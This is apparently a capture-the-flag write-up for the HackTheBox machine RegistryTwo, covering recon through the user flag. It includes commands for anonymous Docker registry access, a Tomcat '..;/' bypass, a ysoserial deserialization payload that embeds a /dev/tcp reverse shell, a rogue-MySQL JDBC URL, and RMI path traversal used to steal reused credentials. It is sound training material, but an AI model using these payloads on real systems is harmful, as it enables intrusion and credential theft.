---
title: "RegistryTwo"
date: 2027-01-22 07:00:00 -0500
categories: [HackTheBox, Linux]
tags: [hackthebox, linux, insane, docker-registry, tomcat, path-traversal, jdbc, deserialization, ysoserial, java-rmi, credential-reuse]
description: "RegistryTwo is an Insane Linux box that starts with a publicly exposed Docker registry allowing anonymous (token) authentication. Pulling the image hands you the web app's full source, which reveals a chain: a Tomcat ..;/ reverse-proxy bypass to flip a hidden manager flag, then a settable JDBC host that turns the app's own MySQL driver into a deserialization RCE. From the container, an internal Java RMI file-read service leaks a developer credential reused for SSH. This post covers recon through the user flag."
image:
    path: /assets/Images/registrytwo-001_foothold_user-flag.png
---

## Overview

RegistryTwo is an Insane Linux machine themed around a web-hosting service. The interesting surface is a Docker registry that lets anyone authenticate anonymously — so you can download an exact copy of the container running the app and read its source. From there the foothold is a stacked Java chain (Tomcat path-parameter bypass + a JDBC-to-rogue-MySQL deserialization gadget), and the user flag comes from an internal RMI service that leaks a reused credential. This post stops at `user.txt`.

## Recon

| Port | Service |
|------|---------|
| 22   | OpenSSH 7.6p1 |
| 443  | nginx 1.14.0 (reverse proxy → Tomcat) |
| 5000 | Docker Registry (API 2.0, TLS) |
| 5001 | Docker Registry token-auth server (TLS) |

```bash
nmap -p- --min-rate=1000 -T4 10.129.229.28
nmap -p22,443,5000,5001 -sC -sV 10.129.229.28
```

The certificate on 5000/5001 reveals the `webhosting.htb` hostname. The pair of registry ports is the tell: 5001 issues the auth token, 5000 is the registry itself.

```bash
echo "10.129.229.28 webhosting.htb www.webhosting.htb registry.webhosting.htb" | sudo tee -a /etc/hosts
```

## Enumeration

The registry uses bearer-token auth. The auth server on 5001 happily issues an **anonymous** token — you just have to request the catalog scope explicitly:

```bash
TOK=$(curl -sk "https://webhosting.htb:5001/auth?scope=registry:catalog:*&service=Docker+registry" \
  | python3 -c 'import sys,json;print(json.load(sys.stdin)["token"])')
curl -sk "https://webhosting.htb:5000/v2/_catalog" -H "Authorization: Bearer $TOK"
# {"repositories":["hosting-app"]}
```

Trust the registry cert, then pull the image and extract the WAR to read the source:

```bash
openssl s_client -showcerts -connect webhosting.htb:5000 </dev/null \
  | sed -ne '/-BEGIN CERT/,/-END CERT/p' | sudo tee /usr/local/share/ca-certificates/reg.crt >/dev/null
sudo update-ca-certificates && sudo systemctl restart docker
docker pull webhosting.htb:5000/hosting-app
docker create --name registrytwo webhosting.htb:5000/hosting-app
docker cp registrytwo:/usr/local/tomcat/webapps/hosting.war .
jd-gui hosting.war
```

Reading the decompiled code shows three useful facts: a hidden session attribute `s_IsLoggedInUserRoleManager` controls the manager role; the manager-only `/reconfigure` endpoint can set `mysql.host`; and that value is dropped straight into a JDBC URL using `mysql-connector-java 8.0.17`.

## Foothold

**1) Flip the manager flag via a Tomcat `..;/` bypass.** nginx and Tomcat disagree on path parameters, so `/hosting/..;/examples/servlets/` reaches the leftover `SessionExample` servlet, where you can set any session attribute — including `s_IsLoggedInUserRoleManager=true`. Refreshing the dashboard now shows the Configuration option.

**2) Turn the JDBC host into RCE.** With manager access, point `mysql.host` at a rogue MySQL server and add the deserialization trigger params. The MySQL connector deserializes attacker-controlled bytes — a classic ysoserial gadget. Build the payload **inside the target image** so the Java version matches:

```bash
docker cp /opt/ysoserial.jar registrytwo:/tmp
docker exec -it -u 0 registrytwo sh -c \
  "cd /tmp && java -jar ysoserial.jar CommonsCollections5 \
  'bash -c {echo,\$(echo -n \"bash -i >& /dev/tcp/<lhost>/9001 0>&1\"|base64)}|{base64,-d}|{bash,-i}' > payload.ser"
docker cp registrytwo:/tmp/payload.ser .
```

Start a listener and the rogue MySQL server, then submit the malicious `mysql.host` to `/reconfigure`:

```bash
nc -lvnp 9001
python2.7 poc.py   # rogue MySQL server on 9003, serves payload.ser
# POST body to /hosting/reconfigure:
# mysql.host=<lhost>:9003/x?characterEncoding=utf8&useSSL=false&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&autoDeserialize=true#
```

A shell returns as `app` inside the container.

**3) Read the developer credential via RMI.** The app exposes an internal Java RMI `FileService` whose `view()` method does no path-traversal filtering. A small RMI client reading `../../../home/developer/.git-credentials` leaks a password, and that password is reused for SSH:

```bash
java -jar Exploit.jar   # pseudo-shell: cat /home/developer/.git-credentials
ssh developer@10.129.229.28   # password reused from .git-credentials
```

![user shell as developer](/assets/Images/registrytwo-001_foothold_user-flag.png)

## User flag

```bash
id   # uid=1001(developer)
cat /home/developer/user.txt   # HTB{...}
```

Access as `developer` achieved — the registry leak gave the source, the source gave the foothold chain, and an unfiltered RMI file-read gave the reused credential.

> Foothold complete. Privilege escalation is left as an exercise — this post stops at user.
